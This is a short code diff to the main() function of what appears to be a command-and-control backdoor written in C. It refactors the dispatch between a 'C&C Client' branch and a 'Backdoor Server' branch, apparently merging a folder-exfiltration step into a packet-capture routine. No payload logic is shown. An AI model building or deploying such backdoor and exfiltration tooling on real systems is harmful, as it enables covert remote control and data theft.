@@ -94,16 +94,9 @@ int main(int argc, char *argv[])
 	ipaddr = resolve(rmthost);
 
 	if (client) // C&C Client
-	{
-		// Start command entry
-		backdoor_client(ipaddr, port, duplex);
-	}
+		backdoor_client(ipaddr, port, duplex); // Start command entry
 	else // Backdoor Server
-	{
-		//exfil_watch(ipaddr, folder);
-
-		pcap_start(filter, duplex);
-	}
+		pcap_start(filter, duplex, ipaddr, folder);
 	
 	return 0;
 }
